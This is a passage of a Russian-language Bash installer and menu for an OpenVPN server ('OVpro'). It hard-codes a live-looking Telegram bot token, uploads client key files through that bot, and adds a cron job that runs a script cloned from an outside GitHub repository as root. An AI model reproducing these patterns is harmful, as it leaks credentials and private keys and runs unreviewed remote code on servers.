      tail -n +2 /etc/openvpn/server/easy-rsa/pki/index.txt | grep "^V" | cut -d '=' -f 2 | nl -s ') ' | grep -iE "$dealer" | cut -d ')' -f 2 >/etc/openvpn/total.json
      total=$(cat /etc/openvpn/total.json | wc -l)
 for ((integer = 1; integer <= ${total}; integer++)); do
        client=$(cat /etc/openvpn/total.json | sed -n "${integer}p" | awk '{print $1}')
        ip=$(cat /etc/openvpn/server/openvpn-status.log | grep "$client" | awk -F',' '{ print $3}')
        ip=$(echo $ip | sed 's/:.*//')

user_IP=$(echo -e "$ip")
user_name=client

echo -e "Юзер: ${Blue}$client${Font_color_suffix} IP: ${Blue}$user_IP${Font_color_suffix}"
done
}
bot(){
  #https://api.telegram.org/bot2004339979:AAE_CWwBx7hSJMH1eHaOWpW5tBB4hdyTVtw/getUpdates
  #curl https://api.telegram.org/bot2004339979:AAE_CWwBx7hSJMH1eHaOWpW5tBB4hdyTVtw/getUpdates | grep "$text" | sed 's|.*id||' | awk -F'"' '{ print $2}' | sed 's/^://' | cut -d "," -f 1
  clear
  text=$(date +%s%N | md5sum | head -c 6)
  echo -e "Перейдите в бота ${Red}@Miscellaneous_ovpn_key_bot${Font_color_suffix}"
  echo -e "Отправьте сообщение с текстом ${Red}$text${Font_color_suffix}"
  read -e -p "После отправки сообщения нажмите ENTER " ask
    if [[ -z ${ask} ]]; then
  uid=$(curl -s https://api.telegram.org/bot2004339979:AAE_CWwBx7hSJMH1eHaOWpW5tBB4hdyTVtw/getUpdates | grep -B 1 "$text" | sed 's|.*from||' | awk -F'"' '{ print $7}' | sed 's/^://' | cut -d "," -f 1)
  uid=$(echo $uid | cut -d " " -f 1)
  id=$(curl -s https://api.telegram.org/bot2004339979:AAE_CWwBx7hSJMH1eHaOWpW5tBB4hdyTVtw/getUpdates | grep "$text" | sed 's|.*from||' | awk -F'"' '{ print $4}' | sed 's/^://' | cut -d "," -f 1)
  if [[ ${uid} == "first_name" ]] ; then
  uid=$(curl -s https://api.telegram.org/bot2004339979:AAE_CWwBx7hSJMH1eHaOWpW5tBB4hdyTVtw/getUpdates | grep -B1 -P "$text" | head -n1 | sed 's|.*update_id||' | sed 's/^"://' | cut -d "," -f 1)
  fi
uid=$(($uid + 1))
curl -s -F "chat_id=$id" -F document=@/root/$client.ovpn https://api.telegram.org/bot2004339979:AAE_CWwBx7hSJMH1eHaOWpW5tBB4hdyTVtw/sendDocument >/dev/null

count=$(curl https://api.telegram.org/bot2004339979:AAE_CWwBx7hSJMH1eHaOWpW5tBB4hdyTVtw/getwebhookinfo | cut -d '"' -f 13 | cut -d "}" -f 1 | cut -d ":" -f 2)
   if [[ ${count} -ge "90" ]] ; then
curl -s https://api.telegram.org/bot2004339979:AAE_CWwBx7hSJMH1eHaOWpW5tBB4hdyTVtw/getUpdates?offset=$uid >/dev/null
   fi


fi
echo -e "${Green}Файл был успешно отправлен!${Font_color_suffix}"




}
multi_client_ask(){
  stat=$(head -27 /etc/openvpn/server/server.conf | tail +27)
  if [[ ${stat} == "duplicate-cn" ]]; then
    stat=$(echo -e "${Red}включен")
    else
      stat=$(echo -e "${Green}отключен")
      fi
   echo -e "${Red}Примечание: Мульти-клиент позволяет использовать 1 ключ на неограниченном количестве устройств!${Font_color_suffix}"
   echo -e "
 Текущий статус: $stat
 ${Blue}1.${Font_color_suffix} ${Yellow}Включить режим мульти-клиента${Font_color_suffix}
 ${Blue}2.${Font_color_suffix} ${Yellow}Отключить режим мульти-клиента${Font_color_suffix}"
  read -e -p "Выберите пункт(ENTER для выхода): " choose
	[[ -z "${choose}" ]] && echo -e "${Error}Отмена..." && exit 1
	if [[ ${choose} == "1" ]]; then
		read -e -p "Хотите включить режим мульти-клиента?(Y/N): " ans
   [[ -z "${ans}" ]] && echo -e "${Error}Отмена..." && exit 1
   if [[ ${ans} == "y" ]]; then
     echo "duplicate-cn" >> /etc/openvpn/server/server.conf
     echo -e "${Green}Режим мульти-клиента успешно включен!${Font_color_suffix}"
     restart_openvpn
    else
		echo -e "${Error} Отмена..." && exit 1
		fi
	elif [[ ${choose} == "2" ]]; then
	  read -e -p "Хотите отключить режим мульти-клиента?(Y/N): " ans
   [[ -z "${ans}" ]] && echo -e "${Error}Отмена..." && exit 1
   if [[ ${ans} == "y" ]]; then
     sed -i "/duplicate-cn/d" /etc/openvpn/server/server.conf
     echo -e "${Green}Режим мульти-клиента успешно отключен!${Font_color_suffix}"
     restart_openvpn
    else
		echo -e "${Error} Отмена..." && exit 1
		fi
		else
		echo -e "${Error} Введите корректный номер(1-2)" && multi_client_ask
	fi
}
dns_change_ask(){
    stat=$(head -15 /etc/openvpn/server/server.conf | tail +15)
if [[ ${stat} == 'push "dhcp-option DNS 8.8.8.8"' ]]; then
  stat=Google
elif [[ ${stat} == 'push "dhcp-option DNS 77.88.8.8"' ]]; then
  stat=Yandex
elif [[ ${stat} == 'push "dhcp-option DNS 4.2.2.3"' ]]; then
  stat=Level3
elif [[ ${stat} == 'push "dhcp-option DNS 9.9.9.9"' ]]; then
  stat=Quad9
elif [[ ${stat} == 'push "dhcp-option DNS 94.140.14.14"' ]]; then
  stat=AdGuard
else
 stat=$(head -15 /etc/openvpn/server/server.conf | tail +15)
 stat2=$(head -16 /etc/openvpn/server/server.conf | tail +16)
 stat=$(echo $stat | awk '{print $4}' | cut -d '"' -f1)
 stat2=$(echo $stat2 | awk '{print $4}' | cut -d '"' -f1)
 stat=$(echo -e "${Red}$stat , $stat2${Font_color_suffix}")
fi

 echo -e "Текущий DNS сервер: ${Blue}$stat${Font_color_suffix}
 Выберите DNS сервер для клиентов (Рекомендация: 1-й):"
	echo -e "   ${Blue}1)${Font_color_suffix} ${Yellow}Стандартный DNS сервер${Font_color_suffix}"
	echo -e "   ${Blue}2)${Font_color_suffix} ${Yellow}Google${Font_color_suffix}"
	echo -e "   ${Blue}3)${Font_color_suffix} ${Yellow}Yandex${Font_color_suffix}"
	echo -e "   ${Blue}4)${Font_color_suffix} ${Yellow}Level3${Font_color_suffix}"
	echo -e "   ${Blue}5)${Font_color_suffix} ${Yellow}Quad9${Font_color_suffix}"
	echo -e "   ${Blue}6)${Font_color_suffix} ${Yellow}AdGuard${Font_color_suffix}"
	read -p "DNS сервер [По умолчанию: 1]: " dns
	until [[ -z "$dns" || "$dns" =~ ^[1-6]$ ]]; do
		echo "$dns: invalid selection."
		read -p "DNS Сервер [По умолчанию: 1]: " dns
		done
		old_dns1=$(head -15 /etc/openvpn/server/server.conf | tail +15)
		old_dns2=$(head -16 /etc/openvpn/server/server.conf | tail +16)
		case "$dns" in
		1|"")
		new_dns1=$(echo 'push "dhcp-option DNS 8.8.8.8"')
		new_dns2=$(echo 'push "dhcp-option DNS 8.8.4.4"')
		sed -i "s/$old_dns1/$new_dns1/" /etc/openvpn/server/server.conf
		sed -i "s/$old_dns2/$new_dns2/" /etc/openvpn/server/server.conf
		;;
		2)
		new_dns1=$(echo 'push "dhcp-option DNS 8.8.8.8"')
		new_dns2=$(echo 'push "dhcp-option DNS 8.8.4.4"')
		sed -i "s/$old_dns1/$new_dns1/" /etc/openvpn/server/server.conf
		sed -i "s/$old_dns2/$new_dns2/" /etc/openvpn/server/server.conf
		;;
		3)
		new_dns1=$(echo 'push "dhcp-option DNS 77.88.8.8"')
		new_dns2=$(echo 'push "dhcp-option DNS 77.88.8.1"')
		sed -i "s/$old_dns1/$new_dns1/" /etc/openvpn/server/server.conf
		sed -i "s/$old_dns2/$new_dns2/" /etc/openvpn/server/server.conf
		;;
		4)
		new_dns1=$(echo 'push "dhcp-option DNS 4.2.2.3"')
		new_dns2=$(echo 'push "dhcp-option DNS 4.2.2.5"')
		sed -i "s/$old_dns1/$new_dns1/" /etc/openvpn/server/server.conf
		sed -i "s/$old_dns2/$new_dns2/" /etc/openvpn/server/server.conf
		;;
		5)
		new_dns1=$(echo 'push "dhcp-option DNS 9.9.9.9"')
		new_dns2=$(echo 'push "dhcp-option DNS 149.112.112.112"')
		sed -i "s/$old_dns1/$new_dns1/" /etc/openvpn/server/server.conf
		sed -i "s/$old_dns2/$new_dns2/" /etc/openvpn/server/server.conf
		;;
		6)
		new_dns1=$(echo 'push "dhcp-option DNS 94.140.14.14"')
		new_dns2=$(echo 'push "dhcp-option DNS 94.140.15.15"')
		sed -i "s/$old_dns1/$new_dns1/" /etc/openvpn/server/server.conf
		sed -i "s/$old_dns2/$new_dns2/" /etc/openvpn/server/server.conf
		;;
esac
echo -e "${Green}DNS успешно изменен!${Font_color_suffix}"
restart_openvpn
}
Autobackup_ask(){
  #stat=$(head -27 /etc/openvpn/server/server.conf | tail +27)
  if [[ ! -e /root/autobackup ]]; then
    stat=$(echo -e "${Red}отключен")
    else
      stat=$(echo -e "${Green}включен")
      fi
  echo -e "Текущий статус: $stat
 ${Blue}1.${Font_color_suffix} ${Yellow}Установить Авто-бэкап${Font_color_suffix}
 ${Blue}2.${Font_color_suffix} ${Yellow}Удалить Авто-бэкап${Font_color_suffix}"
 	read -e -p "(По умолчанию: отмена): " ans
	[[ -z "${ans}" ]] && echo -e "${Error}Отмена..." && exit 1
	if [[ ${ans} == "1" ]]; then
	  if [[ ! -e /root/autobackup ]]; then
	  Autobackup
	  else
	  echo -e "${Red}Авто-бэкап уже установлен!${Font_color_suffix}" && exit;fi
	elif [[ ${ans} == "2" ]]; then
	   read -e -p "Хотите удалить Авто-бэкап?(Y/N): " ans
   [[ -z "${ans}" ]] && echo -e "${Error}Отмена..." && exit 1
   if [[ ${ans} == "y" ]]; then
      if [[ ! -e /root/autobackup ]]; then
     echo -e "${Red}Авто-бэкап не установлен!${Font_color_suffix}" && exit
     else
		 sed -i '/autobackup/d' /root/cronwork
		 crontab /root/cronwork
		 echo -e "${Green}Авто-бэкап был успешно удалён!${Font_color_suffix}"
		 fi
		 elif [[ ${ans} == "n" ]]; then
  echo -e "${Error}Отмена..." && exit 1
   fi
		 else
		echo -e "${Error} Введите корректный номер(1-2)" && Autobackup_ask
	fi
}
Autobackup(){
   read -e -p "Хотите установить Авто-бэкап?(Y/N): " ans
   [[ -z "${ans}" ]] && echo -e "${Error}Отмена..." && exit 1
   if [[ ${ans} == "y" ]]; then
  rm -R /etc/extra 2>/dev/null
  cd /etc
  git clone --quiet https://github.com/Felyt/extra
  cd /etc/extra
  mv "autobackup" "/root"
  chmod +x /root/autobackup
  echo "00 10,12,14,16,18,20,22,00,02 * * * /root/./autobackup" >> /root/cronwork
  crontab /root/cronwork
  echo -e "${Green}Авто-бэкап был успешно установлен!${Font_color_suffix}"
   elif [[ ${ans} == "n" ]]; then
  echo -e "${Error}Отмена..." && exit 1
   fi
}
if [[ ! -e /etc/openvpn/server/server.conf ]]; then
	apt install at
	clear
	echo 'Добро пожаловать в установщик OVpro (Разработчики: Chieftain && xyl1gun4eg && VeroN)!'
	# If system has a single IPv4, it is selected automatically. Else, ask the user
	if [[ $(ip -4 addr | grep inet | grep -vEc '127(\.[0-9]{1,3}){3}') -eq 1 ]]; then
		ip=$(ip -4 addr | grep inet | grep -vE '127(\.[0-9]{1,3}){3}' | cut -d '/' -f 1 | grep -oE '[0-9]{1,3}(\.[0-9]{1,3}){3}')
	else
		number_of_ip=$(ip -4 addr | grep inet | grep -vEc '127(\.[0-9]{1,3}){3}')
		echo
		echo "Какой IPv4 адрес использовать?"
		ip -4 addr | grep inet | grep -vE '127(\.[0-9]{1,3}){3}' | cut -d '/' -f 1 | grep -oE '[0-9]{1,3}(\.[0-9]{1,3}){3}' | nl -s ') '
		read -p "IPv4 address [1]: " ip_number
		until [[ -z "$ip_number" || "$ip_number" =~ ^[0-9]+$ && "$ip_number" -le "$number_of_ip" ]]; do
			echo "$ip_number: invalid selection."
			read -p "IPv4 address [1]: " ip_number
		done
		[[ -z "$ip_number" ]] && ip_number="1"
		ip=$(ip -4 addr | grep inet | grep -vE '127(\.[0-9]{1,3}){3}' | cut -d '/' -f 1 | grep -oE '[0-9]{1,3}(\.[0-9]{1,3}){3}' | sed -n "$ip_number"p)
	fi
	#if $ip is a private IP address, the server must be behind NAT
	    echo "$ip" | grep -qE '^(10\.|172\.1[6789]\.|172\.2[0-9]\.|172\.3[01]\.|192\.168)';
		echo
		echo  -e "Введите ${Blue}IP/Доменное имя${Font_color_suffix} сервера"
		# Get public IP and sanitize with grep
		get_public_ip=$(grep -m 1 -oE '^[0-9]{1,3}(\.[0-9]{1,3}){3}$' <<< "$(wget -T 10 -t 1 -4qO- "http://ip1.dynupdate.no-ip.com/" || curl -m 10 -4Ls "http://ip1.dynupdate.no-ip.com/")")
		read -p "Автоматическое определение IP-адреса [$get_public_ip]: " public_ip
	# If system has a single IPv6, it is selected automatically
	if [[ $(ip -6 addr | grep -c 'inet6 [23]') -eq 1 ]]; then
		ip6=$(ip -6 addr | grep 'inet6 [23]' | cut -d '/' -f 1 | grep -oE '([0-9a-fA-F]{0,4}:){1,7}[0-9a-fA-F]{0,4}')
	fi
	# If system has multiple IPv6, ask the user to select one
	if [[ $(ip -6 addr | grep -c 'inet6 [23]') -gt 1 ]]; then
		number_of_ip6=$(ip -6 addr | grep -c 'inet6 [23]')
		echo
		echo "Какой IPV6 использовать?"
		ip -6 addr | grep 'inet6 [23]' | cut -d '/' -f 1 | grep -oE '([0-9a-fA-F]{0,4}:){1,7}[0-9a-fA-F]{0,4}' | nl -s ') '
		read -p "IPv6 адрес [1]: " ip6_number
		until [[ -z "$ip6_number" || "$ip6_number" =~ ^[0-9]+$ && "$ip6_number" -le "$number_of_ip6" ]]; do
			echo "$ip6_number: invalid selection."
			read -p "IPv6 адрес [1]: " ip6_number
		done
		[[ -z "$ip6_number" ]] && ip6_number="1"
		ip6=$(ip -6 addr | grep 'inet6 [23]' | cut -d '/' -f 1 | grep -oE '([0-9a-fA-F]{0,4}:){1,7}[0-9a-fA-F]{0,4}' | sed -n "$ip6_number"p)
	fi
	echo
	echo "Какой протокол использовать для OpenVPN?"
	echo "   1) UDP"
	echo "   2) TCP"
	read -p "Протокол [По умолчанию: UDP]: " protocol
	until [[ -z "$protocol" || "$protocol" =~ ^[12]$ ]]; do
		echo "$protocol: Ввод неверен"
		read -p "Протокол [По умолчанию: UDP]: " protocol
	done
	case "$protocol" in
		1|"")
		protocol=udp
		;;
		2)
		protocol=tcp
		;;
	esac
	echo
	echo "Какой порт использовать для OpenVPN?"
	read -p "Порт [По умолчанию: 443]: " port
	until [[ -z "$port" || "$port" =~ ^[0-9]+$ && "$port" -le 65535 ]]; do
		echo "$port: ввод неверен"
		read -p "Порт [По умолчанию: 443]: " port
	done
	[[ -z "$port" ]] && port="443"
	echo
	echo "Выберите DNS сервер для клиентов (Рекомендация: 1-й):"
	echo "   1) Текущий DNS сервер"
	echo "   2) Google"
	echo "   3) Yandex"
	echo "   4) Level3"
	echo "   5) Quad9"
	echo "   6) AdGuard"
	read -p "DNS сервер [По умолчанию: 1]: " dns
	until [[ -z "$dns" || "$dns" =~ ^[1-6]$ ]]; do
		echo "$dns: invalid selection."
		read -p "DNS Сервер [По умолчанию: 1]: " dns
	done
	echo
	echo "Введите имя для первого клиента:"
	read -p "Имя [По умолчанию: Admin]: " unsanitized_client
	# Allow a limited set of characters to avoid conflicts
	client=$(sed 's/[^0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-]/_/g' <<< "$unsanitized_client")
	[[ -z "$client" ]] && client="Admin"
	echo
	echo "Установка OpenVPN готова к запуску!"
	# Install a firewall in the rare case where one is not already available
	if ! systemctl is-active --quiet firewalld.service && ! hash iptables 2>/dev/null; then
		if [[ "$os" == "centos" || "$os" == "fedora" ]]; then
			firewall="firewalld"
		elif [[ "$os" == "debian" || "$os" == "ubuntu" ]]; then
			# iptables is way less invasive than firewalld so no warning is given
			firewall="iptables"
		fi
	fi
	read -n1 -r -p "Нажмите любую клавишу для продолжения..."
	# If running inside a container, disable LimitNPROC to prevent conflicts
	if systemd-detect-virt -cq; then
		mkdir /etc/systemd/system/openvpn-server@server.service.d/ 2>/dev/null
		echo "[Service]
LimitNPROC=infinity" > /etc/systemd/system/openvpn-server@server.service.d/disable-limitnproc.conf
	fi
	if [[ "$os" = "debian" || "$os" = "ubuntu" ]]; then
	  Create_Aliases
	  mv ~/OVpro/escflare ~/OVpro/.escflare 2>/dev/null
    source ~/.bash_aliases
    mv ~/OVpro/.escflare /etc/escflare 2>/dev/null
    chmod +x /etc/escflare 2>/dev/null
		apt-get update
		apt-get install -y jq openvpn openssl ca-certificates $firewall
	elif [[ "$os" = "centos" ]]; then
		yum install -y epel-release
		yum install -y openvpn openssl ca-certificates tar $firewall
	else
		# Else, OS must be Fedora
		dnf install -y openvpn openssl ca-certificates tar $firewall
	fi
	# If firewalld was just installed, enable it
	if [[ "$firewall" == "firewalld" ]]; then
		systemctl enable --now firewalld.service
	fi
	# Get easy-rsa
	easy_rsa_url='https://github.com/OpenVPN/easy-rsa/releases/download/v3.0.8/EasyRSA-3.0.8.tgz'
	mkdir -p /etc/openvpn/server/easy-rsa/
	{ wget -qO- "$easy_rsa_url" 2>/dev/null || curl -sL "$easy_rsa_url" ; } | tar xz -C /etc/openvpn/server/easy-rsa/ --strip-components 1
	chown -R root:root /etc/openvpn/server/easy-rsa/
	cd /etc/openvpn/server/easy-rsa/
	# Create the PKI, set up the CA and the server and client certificates
	./easyrsa init-pki
	./easyrsa --batch build-ca nopass
	EASYRSA_CERT_EXPIRE=3650 ./easyrsa build-server-full server nopass
	EASYRSA_CERT_EXPIRE=3650 ./easyrsa build-client-full "$client" nopass
	EASYRSA_CRL_DAYS=3650 ./easyrsa gen-crl
	# Move the stuff we need
	cp pki/ca.crt pki/private/ca.key pki/issued/server.crt pki/private/server.key pki/crl.pem /etc/openvpn/server
	# CRL is read with each client connection, while OpenVPN is dropped to nobody
	chown nobody:"$group_name" /etc/openvpn/server/crl.pem
	# Without +x in the directory, OpenVPN can't run a stat() on the CRL file
	chmod o+x /etc/openvpn/server/
	# Generate key for tls-crypt
	openvpn --genkey --secret /etc/openvpn/server/tc.key
	# Create the DH parameters file using the predefined ffdhe2048 group
	echo '-----BEGIN DH PARAMETERS-----
MIIBCAKCAQEA//////////+t+FRYortKmq/cViAnPTzx2LnFg84tNpWp4TZBFGQz
+8yTnc4kmz75fS/jY2MMddj2gbICrsRhetPfHtXV/WVhJDP1H18GbtCFY2VVPe0a
87VXE15/V8k1mE8McODmi3fipona8+/och3xWKE2rec1MKzKT0g6eXq8CrGCsyT7
YdEIqUuyyOP7uWrat2DX9GgdT0Kj3jlN9K5W7edjcrsZCwenyO4KbXCeAvzhzffi
7MA0BM0oNC9hkXL+nOmFg/+OTxIy7vKBg8P+OxtMb61zO7X8vC7CIAXFjvGDfRaD
ssbzSibBsu/6iGtCOGEoXJf//////////wIBAg==
-----END DH PARAMETERS-----' > /etc/openvpn/server/dh.pem
	# Generate server.conf
	echo "local $ip
port $port
proto $protocol
dev tun
ca ca.crt
cert server.crt
key server.key
dh dh.pem
auth SHA256
auth-nocache
cipher AES-128-GCM
tls-crypt tc.key
topology subnet
server 10.8.0.0 255.255.252.0" > /etc/openvpn/server/server.conf
	# IPv6
	if [[ -z "$ip6" ]]; then
		echo 'push "redirect-gateway def1 bypass-dhcp"' >> /etc/openvpn/server/server.conf
	else
		echo 'server-ipv6 fddd:1194:1194:1194::/64' >> /etc/openvpn/server/server.conf
		echo 'push "redirect-gateway def1 ipv6 bypass-dhcp"' >> /etc/openvpn/server/server.conf
	fi
	echo 'ifconfig-pool-persist ipp.txt' >> /etc/openvpn/server/server.conf
	# DNS
	case "$dns" in
		1|"")
			# Locate the proper resolv.conf
			# Needed for systems running systemd-resolved
			if grep -q '^nameserver 127.0.0.53' "/etc/resolv.conf"; then
				resolv_conf="/run/systemd/resolve/resolv.conf"
			else
				resolv_conf="/etc/resolv.conf"
			fi
			# Obtain the resolvers from resolv.conf and use them for OpenVPN
			grep -v '^#\|^;' "$resolv_conf" | grep '^nameserver' | grep -oE '[0-9]{1,3}(\.[0-9]{1,3}){3}' | while read line; do
				echo "push \"dhcp-option DNS $line\"" >> /etc/openvpn/server/server.conf
			done
		;;
		2)
			echo 'push "dhcp-option DNS 8.8.8.8"' >> /etc/openvpn/server/server.conf
			echo 'push "dhcp-option DNS 8.8.4.4"' >> /etc/openvpn/server/server.conf
		;;
		3)
			echo 'push "dhcp-option DNS 77.88.8.8"' >> /etc/openvpn/server/server.conf
			echo 'push "dhcp-option DNS 77.88.8.1"' >> /etc/openvpn/server/server.conf
		;;
		4)
			echo 'push "dhcp-option DNS 4.2.2.3"' >> /etc/openvpn/server/server.conf
			echo 'push "dhcp-option DNS 4.2.2.5"' >> /etc/openvpn/server/server.conf
		;;
		5)
			echo 'push "dhcp-option DNS 9.9.9.9"' >> /etc/openvpn/server/server.conf
			echo 'push "dhcp-option DNS 149.112.112.112"' >> /etc/openvpn/server/server.conf
		;;
		6)
			echo 'push "dhcp-option DNS 94.140.14.14"' >> /etc/openvpn/server/server.conf
			echo 'push "dhcp-option DNS 94.140.15.15"' >> /etc/openvpn/server/server.conf
		;;
	esac
	echo "keepalive 10 120
cipher AES-128-GCM
user nobody
group $group_name
persist-key
persist-tun
status /etc/openvpn/server/openvpn-status.log
verb 3
crl-verify crl.pem" >> /etc/openvpn/server/server.conf
	if [[ "$protocol" = "udp" ]]; then
		echo "explicit-exit-notify" >> /etc/openvpn/server/server.conf
	fi
	# Enable net.ipv4.ip_forward for the system
	echo 'net.ipv4.ip_forward=1' > /etc/sysctl.d/30-openvpn-forward.conf
	# Enable without waiting for a reboot or service restart
	echo 1 > /proc/sys/net/ipv4/ip_forward
	if [[ -n "$ip6" ]]; then
		# Enable net.ipv6.conf.all.forwarding for the system
		echo "net.ipv6.conf.all.forwarding=1" >> /etc/sysctl.d/30-openvpn-forward.conf
		# Enable without waiting for a reboot or service restart
		echo 1 > /proc/sys/net/ipv6/conf/all/forwarding
	fi
	if systemctl is-active --quiet firewalld.service; then
		# Using both permanent and not permanent rules to avoid a firewalld
		# reload.
		# We don't use --add-service=openvpn because that would only work with
		# the default port and protocol.
		firewall-cmd --add-port="$port"/"$protocol"
		firewall-cmd --zone=trusted --add-source=10.8.0.0/22
		firewall-cmd --permanent --add-port="$port"/"$protocol"
		firewall-cmd --permanent --zone=trusted --add-source=10.8.0.0/22
		# Set NAT for the VPN subnet
		firewall-cmd --direct --add-rule ipv4 nat POSTROUTING 0 -s 10.8.0.0/22 ! -d 10.8.0.0/22 -j SNAT --to "$ip"
		firewall-cmd --permanent --direct --add-rule ipv4 nat POSTROUTING 0 -s 10.8.0.0/22 ! -d 10.8.0.0/22 -j SNAT --to "$ip"
		if [[ -n "$ip6" ]]; then
			firewall-cmd --zone=trusted --add-source=fddd:1194:1194:1194::/64
			firewall-cmd --permanent --zone=trusted --add-source=fddd:1194:1194:1194::/64
			firewall-cmd --direct --add-rule ipv6 nat POSTROUTING 0 -s fddd:1194:1194:1194::/64 ! -d fddd:1194:1194:1194::/64 -j SNAT --to "$ip6"
			firewall-cmd --permanent --direct --add-rule ipv6 nat POSTROUTING 0 -s fddd:1194:1194:1194::/64 ! -d fddd:1194:1194:1194::/64 -j SNAT --to "$ip6"
		fi
	else
		# Create a service to set up persistent iptables rules
		iptables_path=$(command -v iptables)
		ip6tables_path=$(command -v ip6tables)
		# nf_tables is not available as standard in OVZ kernels. So use iptables-legacy
		# if we are in OVZ, with a nf_tables backend and iptables-legacy is available.
		if [[ $(systemd-detect-virt) == "openvz" ]] && readlink -f "$(command -v iptables)" | grep -q "nft" && hash iptables-legacy 2>/dev/null; then
			iptables_path=$(command -v iptables-legacy)
			ip6tables_path=$(command -v ip6tables-legacy)
		fi
		echo "[Unit]
Before=network.target
[Service]
Type=oneshot
ExecStart=$iptables_path -t nat -A POSTROUTING -s 10.8.0.0/22 ! -d 10.8.0.0/22 -j SNAT --to $ip
ExecStart=$iptables_path -I INPUT -p $protocol --dport $port -j ACCEPT
ExecStart=$iptables_path -I FORWARD -s 10.8.0.0/22 -j ACCEPT
ExecStart=$iptables_path -I FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT
ExecStop=$iptables_path -t nat -D POSTROUTING -s 10.8.0.0/22 ! -d 10.8.0.0/22 -j SNAT --to $ip
ExecStop=$iptables_path -D INPUT -p $protocol --dport $port -j ACCEPT
ExecStop=$iptables_path -D FORWARD -s 10.8.0.0/22 -j ACCEPT
ExecStop=$iptables_path -D FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT" > /etc/systemd/system/openvpn-iptables.service
		if [[ -n "$ip6" ]]; then
			echo "ExecStart=$ip6tables_path -t nat -A POSTROUTING -s fddd:1194:1194:1194::/64 ! -d fddd:1194:1194:1194::/64 -j SNAT --to $ip6
ExecStart=$ip6tables_path -I FORWARD -s fddd:1194:1194:1194::/64 -j ACCEPT
ExecStart=$ip6tables_path -I FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT
ExecStop=$ip6tables_path -t nat -D POSTROUTING -s fddd:1194:1194:1194::/64 ! -d fddd:1194:1194:1194::/64 -j SNAT --to $ip6
ExecStop=$ip6tables_path -D FORWARD -s fddd:1194:1194:1194::/64 -j ACCEPT
ExecStop=$ip6tables_path -D FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT" >> /etc/systemd/system/openvpn-iptables.service
		fi
		echo "RemainAfterExit=yes
[Install]
WantedBy=multi-user.target" >> /etc/systemd/system/openvpn-iptables.service
		systemctl enable --now openvpn-iptables.service
	fi
	# If SELinux is enabled and a custom port was selected, we need this
	if sestatus 2>/dev/null | grep "Current mode" | grep -q "enforcing" && [[ "$port" != 1194 ]]; then
		# Install semanage if not already present
		if ! hash semanage 2>/dev/null; then
			if [[ "$os_version" -eq 7 ]]; then
				# Centos 7
				yum install -y policycoreutils-python
			else
				# CentOS 8 or Fedora
				dnf install -y policycoreutils-python-utils
			fi
		fi
		semanage port -a -t openvpn_port_t -p "$protocol" "$port"
	fi
	# If the server is behind NAT, use the correct IP address
	[[ -n "$public_ip" ]] && ip="$public_ip"
	pubip=$(curl -s ifconfig.me)
	# client-common.txt is created so we have a template to add further users later
	echo "client
proto udp
remote vip.sprix.online 443
dev tun
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
verify-x509-name server_m0H59NM8J9drb2ut name
auth SHA256
auth-nocache
cipher AES-128-GCM
tls-client
tls-version-min 1.2
tls-cipher TLS-ECDHE-ECDSA-WITH-AES-128-GCM-SHA256
ignore-unknown-option block-outside-dns
setenv opt block-outside-dns # Prevent Windows 10 DNS leak
verb 3" > /etc/openvpn/server/client-common.txt
	# Enable and start the OpenVPN service
	\cp -f /usr/share/zoneinfo/Asia/Ashgabat /etc/localtime
	systemctl enable --now openvpn-server@server.service
	# Generates the custom client.ovpn
	new_client
        clear
	echo "Установка завершена!"
	~/OVpro/./ovpn
else
  domainofserver=$(cat /etc/openvpn/server/client-common.txt | sed -n 4p | cut -d ' ' -f 2)
	serverip123="$(curl -s "ifconfig.me")"
	number_of_clients=$(tail -n +2 /etc/openvpn/server/easy-rsa/pki/index.txt | grep -c "^V")
	number_of_active=$(cat /etc/openvpn/server/openvpn-status.log | grep CLIENT_LIST | tail -n +2 | grep -c CLIENT_LIST)
	clear
	mv ~/OVpro/escflare ~/OVpro/.escflare 2>/dev/null
	echo
	echo  -e "${Morg}${Blue}Chieftain && xyl1gun4eg && VeroN [OVpro Control]${Font_color_suffix} "
	echo
echo -e "Приветствую, администратор сервера! Дата: ${Blue}$(date +"%d/%m/%Y")${Font_color_suffix}
Всего ключей на сервере:" ${Blue}$number_of_clients${Font_color_suffix}
echo -e "Всего подключенных пользователей:" ${Blue}$number_of_active${Font_color_suffix}
echo -e "
IP сервера: ${Blue}$serverip123${Font_color_suffix}
Доменное имя сервера: ${Blue}$domainofserver${Font_color_suffix}
${Blue}|------------------------------------|${Font_color_suffix}
${Blue}|————————${Font_color_suffix} Управление ключами ${Blue}————————${Font_color_suffix}${Blue}|${Font_color_suffix}
${Blue}|1.${Font_color_suffix} ${Yellow}Создать ключ${Font_color_suffix}                     ${Blue}|${Font_color_suffix}
${Blue}|2.${Font_color_suffix} ${Yellow}Удалить ключ${Font_color_suffix}                     ${Blue}|${Font_color_suffix}
${Blue}|3.${Font_color_suffix} ${Yellow}Получить список клиентов${Font_color_suffix}         ${Blue}|${Font_color_suffix}
${Blue}|4.${Font_color_suffix} ${Yellow}Получить ссылки на ключи${Font_color_suffix}         ${Blue}|${Font_color_suffix}
${Blue}|5.${Font_color_suffix} ${Yellow}Показать подключенные IP-адреса${Font_color_suffix}  ${Blue}|${Font_color_suffix}
${Blue}|6.${Font_color_suffix} ${Yellow}Фильтр для удаления ключей${Font_color_suffix}       ${Blue}|${Font_color_suffix}
${Blue}|————————${Font_color_suffix} Управление базой ${Blue}——————————${Font_color_suffix}${Blue}|${Font_color_suffix}
${Blue}|7.${Font_color_suffix} ${Yellow}Выгрузить Базу${Font_color_suffix}                   ${Blue}|${Font_color_suffix}
${Blue}|8.${Font_color_suffix} ${Yellow}Загрузить Базу${Font_color_suffix}                   ${Blue}|${Font_color_suffix}
${Blue}|9.${Font_color_suffix} ${Yellow}Изменить адрес сервера${Font_color_suffix}           ${Blue}|${Font_color_suffix}
${Blue}|————————${Font_color_suffix} Управление скриптом ${Blue}———————${Font_color_suffix}${Blue}|${Font_color_suffix}
${Blue}|10.${Font_color_suffix} ${Yellow}Удалить OpenVPN${Font_color_suffix}                 ${Blue}|${Font_color_suffix}
${Blue}|11.${Font_color_suffix} ${Yellow}Включить OpenVPN${Font_color_suffix}                ${Blue}|${Font_color_suffix}
